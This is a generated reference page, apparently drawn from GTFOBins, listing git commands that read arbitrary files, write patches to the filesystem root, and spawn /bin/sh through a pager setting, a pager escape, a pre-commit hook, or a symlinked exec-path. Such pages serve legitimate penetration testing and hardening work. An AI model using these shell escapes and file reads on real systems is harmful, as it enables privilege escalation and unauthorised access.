---
parsed_by: focuslocust
source: commands
type: generated
---
# git Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## git

Tool page: [git](../../tools/linux/git.md)

### file-read

```text
git diff /dev/null /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
git apply --unsafe-paths --directory / x.patch
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
git help config
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
git branch --help config
!/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |

### shell

```text
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |

### shell

```text
git init .
echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git -C . commit --allow-empty -m x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |

### shell

```text
ln -s /bin/sh git-x
git --exec-path=. x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/git` |
| Evidence | Function example preserved from source parser. |
